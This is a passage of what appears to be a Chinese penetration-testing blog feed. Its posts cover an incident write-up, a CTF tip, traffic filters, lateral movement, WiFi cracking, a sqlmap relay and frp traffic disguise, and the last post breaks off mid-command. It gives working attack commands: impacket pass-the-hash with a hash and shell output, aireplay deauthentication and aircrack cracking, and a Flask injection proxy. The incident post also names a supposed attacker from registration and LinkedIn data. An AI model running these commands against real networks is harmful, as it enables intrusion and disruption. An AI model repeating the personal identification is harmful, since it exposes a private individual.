http://110.xx.xx.xx:xx/tools/downloadfile?fileid=1271cf84-dc99-11ec-94b8-5254004d88fb</code></p><p><strong>得到疑似红队下载服务器vps-2：110.xx.xx.xx</strong></p><p>发现内网扫描有ms17-010漏洞，但是登录ms17-010机器排查后暂无告警和对外连接信息，还未被当做跳板。</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgimg202310261418393.png" alt="image-20231026141830363"></p></li><li><p>使用nps进行内网穿透</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261422156.png" alt="image-20231026142254111"></p><p>发现nps穿透的ip与下载服务器ip一致，确定为红队<strong>vps-2：110.xx.xx.xx</strong>。</p></li><li><p>使用echo命令写webshell，并远程下载执行linux木马</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261427882.png" alt="image-20231026142751827"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261430775.png" alt="image-20231026143053739"></p><p>通过查看webshell和linux木马文件确定写入时间为5-30日，拿出5.29-5.30两天的web日志进行分析。</p></li></ol><h3 id="1-2攻击路径排查"><a href="#1-2攻击路径排查" class="headerlink" title="1.2攻击路径排查"></a>1.2攻击路径排查</h3><ol><li><p>web日志排查</p><p>通过查看两天的日志，日志量实在太大，直接取巧搜索常见命令，<code>whoami</code>，发现有一个链接非常可疑，一眼确定是jndi注入得到的内存马。</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261438611.png" alt="image-20231026143837567"></p><p>得到可疑ip：223.104.165.202</p></li><li><p>复现攻击手法</p><p>该ip最早访问时间为29日下午13点，通过观察访问请求，发现主要访问登陆页面，</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261441679.png" alt="image-20231026144134645"></p><p>手工进行测试登录页面，重点测试jndi注入，发现登录接口存在log4j2漏洞。</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261443128.png" alt="image-20231026144332091"></p></li></ol><h3 id="1-3-还原攻击链"><a href="#1-3-还原攻击链" class="headerlink" title="1.3 还原攻击链"></a>1.3 还原攻击链</h3><ol><li><p>先清理各类木马文件及攻击工具，通过收集到的信息还原攻击链：</p><p><strong>攻击者使用ip（223.xx.xx.202）通过网站登陆页面(<a href="https://183.xx.xx.xx/)%E7%9A%84log4j2">https://183.xx.xx.xx/)的log4j2</a> RCE漏洞获取执行命令权限，使用定时任务反弹shell（反弹vps-1：47.103.222.185）控制服务器，并使用fscan进行内网扫描以及nps（vps-2服务器110.42.64.137）进行横行渗透，并写入webshell和linux后门（控制vps-2：110.42.64.137）</strong></p></li></ol><h2 id="2-溯源"><a href="#2-溯源" class="headerlink" title="2.溯源"></a>2.溯源</h2><ol><li><p>vps溯源</p><p>通过对远控ip（47.xx.xx.xx）进行溯源，对应域名为xxxx.com</p><p>查看icp备案信息，站点归属个人 ：李xx</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261531850.png" alt="image-20231026153128792"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261452251.png" alt="image-20231026145242205"></p><p>互联网查找此人相关信息，找到领英个人主页，目前工作在xx单位的信息安全工程师，主页地址如下:</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261454559.png" alt="image-20231026145439528"></p><p>这不是妥妥的黑客嘛？当场逮到，社工库都不用查了。。。</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261519017.png" alt="006APoFYly1g9yc474qgsj30hs0ehjsd"></p></li></ol><h2 id="3-整理报告，收工"><a href="#3-整理报告，收工" class="headerlink" title="3.整理报告，收工"></a>3.整理报告，收工</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261549252.png" alt="攻击溯源反制"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf</title>
    <link href="/2023/10/08/ctf/"/>
    <url>/2023/10/08/ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="一-简单得分"><a href="#一-简单得分" class="headerlink" title="一.简单得分"></a>一.简单得分</h2><ol><li><p>linux服务器下根目录或者root目录下<code>flag.txt</code></p><p>提权后使用命令全盘检索<code>find  /  -type f -name &quot;*flag*&quot;</code></p></li><li><p>base64解密</p></li><li></li></ol>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>流量分析</title>
    <link href="/2023/09/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2023/09/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="一-wireshark"><a href="#一-wireshark" class="headerlink" title="一.wireshark"></a>一.wireshark</h2><h3 id="1-icmp"><a href="#1-icmp" class="headerlink" title="1.icmp"></a>1.icmp</h3><ul><li><p>icmp扫描目标统计</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">icmp.<span class="hljs-keyword">type</span> <span class="hljs-type">== </span><span class="hljs-number">8</span> &amp;&amp; ip.src_host==攻击ip<br></code></pre></td></tr></table></figure></li><li><p>icmp响应ip筛选，探活统计</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">icmp.<span class="hljs-keyword">type</span> <span class="hljs-type">== </span><span class="hljs-number">0</span> &amp;&amp; ip.src_host==攻击ip<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-tcp"><a href="#2-tcp" class="headerlink" title="2..tcp"></a>2..tcp</h3><ul><li><p>tcp syn扫描响应统计</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tcp<span class="hljs-selector-class">.flags</span><span class="hljs-selector-class">.ack</span> ==<span class="hljs-number">1</span> &amp;&amp; tcp<span class="hljs-selector-class">.flags</span><span class="hljs-selector-class">.syn</span> == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="二-tcpdump"><a href="#二-tcpdump" class="headerlink" title="二.tcpdump"></a>二.tcpdump</h2><ul><li><p>icmp回显Ip筛选（Echo Reply type&#x3D;0 ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcpdump -n -r xx.cap &#x27;icmp[0]=0 and dst host 攻击ip&#x27; | awk &#x27;&#123;print $3&#125;&#x27;<br></code></pre></td></tr></table></figure></li><li><p>tcp探活端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcpdump -n -r xx.cap &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27;| sort -u<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网横向移动合集</title>
    <link href="/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/"/>
    <url>/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="一-各种端口"><a href="#一-各种端口" class="headerlink" title="一.各种端口"></a>一.各种端口</h2><h3 id="135端口"><a href="#135端口" class="headerlink" title="135端口"></a>135端口</h3><ul><li>psexec</li></ul><blockquote><p>需要开启注册表&#96;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f&#96;&#96;&#96;&#96;</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#用户名密码传递 </span><br><span class="hljs-comment">#psexec.py k3rwin:k3rwin@10.211.55.10 whoami</span><br><br><span class="hljs-comment">#ntml hash传递</span><br>╭─ ~                                                                                                      ✔  3s ─╮<br>╰─ psexec.py -hashes :20cc171a17c512fa303b0b7502fe1c34 k3rwin@192.168.0.110 -codec GBK                               ─╯<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[*] Requesting shares on 192.168.0.110.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file WghUwOTP.exe<br>[*] Opening SVCManager on 192.168.0.110.....<br>[*] Creating service yrWr on 192.168.0.110.....<br>[*] Starting service yrWr.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [版本 10.0.19045.3324]<br>(c) Microsoft Corporation。保留所有权利。<br><br>C:\WINDOWS\system32&gt; <span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure><ul><li>wmiexec</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">╭─ ~                                                                                                         2 ✘ ─╮<br>╰─ wmiexec.py -hashes :20cc171a17c512fa303b0b7502fe1c34 k3rwin@192.168.0.110 -codec GBK                              ─╯<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[*] SMBv3.0 dialect used<br>[!] Launching semi-interactive shell - Careful what you execute<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>C:\&gt;<span class="hljs-built_in">whoami</span><br>desktop-duv9jg1\k3rwin<br></code></pre></td></tr></table></figure><h3 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h3><ul><li><p>smbexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">╭─ ~                                                                                                         1 ✘ ─╮<br>╰─ smbexec.py k3rwin:k3rwin@192.168.0.110                                                                            ─╯<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[!] Launching semi-interactive shell - Careful what you execute<br>C:\WINDOWS\system32&gt;<span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure></li></ul><h3 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h3>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>近源渗透</title>
    <link href="/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/"/>
    <url>/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="近源渗透"><a href="#近源渗透" class="headerlink" title="近源渗透"></a>近源渗透</h1><h2 id="一-wifi破解"><a href="#一-wifi破解" class="headerlink" title="一.wifi破解"></a>一.wifi破解</h2><ol><li><p>列出可用无线网卡</p><p><code>airmon-ng</code></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png" alt="image-20230902125854051"></p></li><li><p>开启网卡监控</p><p><code>airmon-ng check kill</code></p><p><code>airmon-ng start wlan0</code></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021301071.png" alt="image-20230902130113036"></p></li><li><p>扫描wifi</p><blockquote><p>wlan0开启网卡监控后查看重新名称是否修改，ifconfig</p><p>可能会变成wlan0mon</p><p><strong>关键点：</strong></p><ul><li><p><strong>·BSSID：网卡MAC地址，</strong></p></li><li><p><strong>·CH：信道通道(频道)，</strong></p></li><li><p><strong>·ESSID：Wifi名称，</strong></p></li><li><p><strong>·STATION：可理解为连接着这个网络的某一台手机的MAC地址</strong></p></li></ul><p> <strong>.PWR：信号强弱程度，数值越小信号越强；</strong></p><p> <strong>.DATA：数据量，越大使用的人就越多</strong></p></blockquote><p><code>airmon-ng start wlan0</code> </p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021331489.png" alt="image-20230902133126443"></p></li><li><p>抓包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng -w wifi -c 11 --bssid 64:64:4A:B3:B4:56 wlan0 <br><br>    -c：指定信道<br>     -w：保存数据包名<br>     --bssid：指定路由器的MAC<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021352164.png" alt="image-20230902135235126"></p></li><li><p>wifi攻击，打断重连获取握手包(可选)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aireplay-ng -0 0 -c BC:D0:74:1E:2B:1D -a 64:64:4A:B3:B4:56 wlan0<br><br>-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）<br>-a：指定路由器的MAC<br>-c：指定客户机的MAC<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021404818.png" alt="image-20230902140416760"></p></li><li><p>暴力破解(撞库)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng  -w  /home/parallels/Desktop/pass wifi-09.cap<br>-w 破解字典<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021407583.png" alt="image-20230902140752535"></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python实现sql中转注入</title>
    <link href="/2022/12/12/python%E5%AE%9E%E7%8E%B0sql%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/12/12/python%E5%AE%9E%E7%8E%B0sql%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><blockquote><p>sqlmap在进行常规注入时没有什么问题，但是遇到一些json数据包注入或者注入参数有特殊编码等情况时可能会比较难测试，可以借助python Flask框架进行参数处理并转发来实现中转注入。</p></blockquote><ul><li><p>工具及环境准备</p><ul><li><p>burp+python插件</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgburp%E6%8F%92%E4%BB%B6.png" alt="image-20221212152700890"></p><p>可以直接将数据包复制为python request代码</p></li><li><p>flask框架</p><p><code>pip3 install Flask Jinja2</code></p></li></ul></li></ul><h2 id="2-适用场景"><a href="#2-适用场景" class="headerlink" title="2.适用场景"></a>2.适用场景</h2><h3 id="sqli-labs-Less-21"><a href="#sqli-labs-Less-21" class="headerlink" title="sqli-labs-Less-21"></a>sqli-labs-Less-21</h3><blockquote><p><strong>注入点在cookie参数内，并且需要进行base64编码</strong></p></blockquote><ol><li><p>登录获取注入数据包, 生成python代码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://121.5.147.57:85/Less-21/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D; PHPSESSID=ft0ss1d7f4rt7tgaksedlfd7a0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgrequest.png" alt="image-20221212153545842"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://x/Less-21/index.php&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;uname&quot;</span>: <span class="hljs-string">&quot;YWRtaW4%3D&quot;</span>, <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;ft0ss1d7f4rt7tgaksedlfd7a0&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;Cache-Control&quot;</span>: <span class="hljs-string">&quot;max-age=0&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://121.5.147.57:85/Less-21/&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)<br></code></pre></td></tr></table></figure></li><li><p>应用python flask框架</p><blockquote><p>原理: flask接收sqlmap注入payload, flask将payload处理后发送给目标服务器, flask将响应包返回给sqlmap</p></blockquote></li></ol><p>​<img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="image-20221212154726619"></p><ul><li><p>python代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote <br><br><br><span class="hljs-comment">#处理注入参数,不确定注入点可设置多个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sql</span>(<span class="hljs-params">payload</span>):<br>    burp0_url = <span class="hljs-string">&quot;http://x/Less-21/index.php&quot;</span><br>    burp0_cookies = &#123;<span class="hljs-string">&quot;uname&quot;</span>: quote(base64.b64encode(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;ft0ss1d7f4rt7tgaksedlfd7a0&quot;</span>&#125;<br>    burp0_headers = &#123;<span class="hljs-string">&quot;Cache-Control&quot;</span>: <span class="hljs-string">&quot;max-age=0&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://121.5.147.57:85/Less-21/&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)<br>    <span class="hljs-keyword">return</span> r.text<br><br><br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        payload = request.args.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">elif</span>  request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        payload = request.form.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">return</span> sql(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure></li></ul><h2 id="3-实现效果"><a href="#3-实现效果" class="headerlink" title="3.实现效果"></a>3.实现效果</h2><ol><li><p>本地启用flash代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 sql.py<br> * Serving Flask app &#x27;sql&#x27;<br> * Debug mode: on<br>WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.<br> * Running on http://127.0.0.1:5000<br>Press CTRL+C to quit<br> * Restarting with stat<br> * Debugger is active!<br> * Debugger PIN: 755-194-376<br>127.0.0.1 - - [12/Dec/2022 15:52:37] &quot;GET / HTTP/1.1&quot; 200 -<br>127.0.0.1 - - [12/Dec/2022 15:52:37] &quot;GET /images/Less-21.jpg HTTP/1.1&quot; 404 -<br>127.0.0.1 - - [12/Dec/2022 15:52:37] &quot;GET /images/slap1.jpg HTTP/1.1&quot; 404 -<br></code></pre></td></tr></table></figure></li><li><p>sqlmap进行测试</p><p><code>sqlmap -u &quot;http://127.0.0.1:5000/?payload=admin&quot; --current-db</code></p></li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202212121555364.png" alt="image-20221212155535321"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frp魔改-隐藏特征</title>
    <link href="/2022/08/09/frp%E9%AD%94%E6%94%B9-%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/"/>
    <url>/2022/08/09/frp%E9%AD%94%E6%94%B9-%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/</url>
    
    <content type="html"><![CDATA[<h1 id="frp魔改-隐藏特征"><a href="#frp魔改-隐藏特征" class="headerlink" title="frp魔改-隐藏特征"></a>frp魔改-隐藏特征</h1><h2 id="0x1-使用tls加密连接（推荐）"><a href="#0x1-使用tls加密连接（推荐）" class="headerlink" title="0x1.使用tls加密连接（推荐）"></a>0x1.使用tls加密连接（推荐）</h2><h3 id="1-openssl生成证书"><a href="#1-openssl生成证书" class="headerlink" title="1.openssl生成证书"></a>1.openssl生成证书</h3><p><a href="https://gofrp.org/docs/features/common/network/network-tls/#tls-%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E6%96%B9%E5%BC%8F">参考官方文档</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /etc/pki/tls/openssl.cnf ./my-openssl.cnf<br><br>openssl genrsa -out ca.key 2048<br><br>openssl req -x509 -new -nodes -key ca.key -subj &quot;/CN=example.ca.com&quot; -days 5000 -out ca.crt<br><br><br>openssl genrsa -out server.key 2048<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">此处ip和dns换成对应vps服务端运行frps程序的ip和域名</span><br>openssl req -new -sha256 -key server.key \<br>    -subj &quot;/C=XX/ST=DEFAULT/L=DEFAULT/O=DEFAULT/CN=server.com&quot; \<br>    -reqexts SAN \<br>    -config &lt;(cat my-openssl.cnf &lt;(printf &quot;\n[SAN]\nsubjectAltName=DNS:localhost,IP:43.x.x.80,DNS:demo.com&quot;)) \<br>    -out server.csr<br><span class="hljs-meta prompt_"># </span><span class="language-bash">此处ip和dns换成对应vps服务端运行frps程序的ip和域名</span><br>openssl x509 -req -days 365 \<br>-in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \<br>-extfile &lt;(printf &quot;subjectAltName=DNS:localhost,IP:43.x.x.80,DNS:demo.com&quot;) \<br>-out server.crt<br><br><br>openssl genrsa -out client.key 2048<br><br>openssl req -new -sha256 -key client.key \<br>    -subj &quot;/C=XX/ST=DEFAULT/L=DEFAULT/O=DEFAULT/CN=client.com&quot; \<br>    -reqexts SAN \<br>    -config &lt;(cat my-openssl.cnf &lt;(printf &quot;\n[SAN]\nsubjectAltName=DNS:client.com,DNS:example.client.com&quot;)) \<br>    -out client.csr<br><br>openssl x509 -req -days 365 \<br>    -in client.csr -CA 